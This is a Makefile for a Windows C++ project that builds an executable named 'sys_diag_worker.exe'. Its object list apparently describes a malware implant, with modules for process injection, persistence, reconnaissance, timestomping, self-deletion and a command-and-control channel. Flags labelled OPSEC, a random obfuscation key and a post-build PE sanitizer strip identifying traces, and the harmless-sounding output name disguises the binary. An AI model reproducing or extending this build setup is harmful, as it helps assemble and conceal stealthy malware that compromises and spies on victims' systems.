# ==========================================
# Clean Architecture Build System
# ==========================================

CC = x86_64-w64-mingw32-g++
AS = nasm

OBF_KEY = $(shell python3 -c "import random; print(random.randint(1, 255))")


STRIP_PATHS = -fmacro-prefix-map=$(CURDIR)=.

# Compiler Flags
CFLAGS = -std=c++14 -masm=intel -static -I. \
         -DOBF_KEY=$(OBF_KEY) \
         $(STRIP_PATHS) \
         -s -Os -flto -ffunction-sections -fdata-sections \
         -fno-exceptions -fno-rtti -mwindows -fno-ident

# Linker Flags (OPSEC)
LDFLAGS = -Wl,--build-id=none -Wl,--gc-sections \
          -Wl,--dynamicbase -Wl,--nxcompat -Wl,--high-entropy-va -lws2_32

ASFLAGS = -f win64


LIBS = 


OUT_FILE = sys_diag_worker.exe

OBJS = Core/main.o Core/api_resolve.o Core/syscalls.o Core/dispatcher.o \
       Core/syscalls_asm.o \
       Crypto/encryption.o \
       Evasion/mutex_lock.o Evasion/timestomp.o \
       Modules/file_io.o Modules/ghost.o Modules/injection.o Modules/persistence.o Modules/recon.o Modules/suicide.o \
       Network/c2_server.o \
       Utils/helpers.o


all: $(OUT_FILE) post_build_cleanup

$(OUT_FILE): $(OBJS)
	$(CC) $(OBJS) -o $(OUT_FILE) $(CFLAGS) $(LDFLAGS) $(LIBS)

Core/syscalls_asm.o: Core/syscalls_asm.asm
	$(AS) $(ASFLAGS) $< -o $@

%.o: %.cpp
	$(CC) -c $< -o $@ $(CFLAGS)


post_build_cleanup: $(OUT_FILE)
	@echo "[*] Build successful: $(OUT_FILE) (Key: $(OBF_KEY))"
	@echo "[*] Running PE sanitization pipeline..."
	@python3 pe_sanitizer.py $(OUT_FILE)

clean:
	rm -f $(OBJS) $(OUT_FILE)
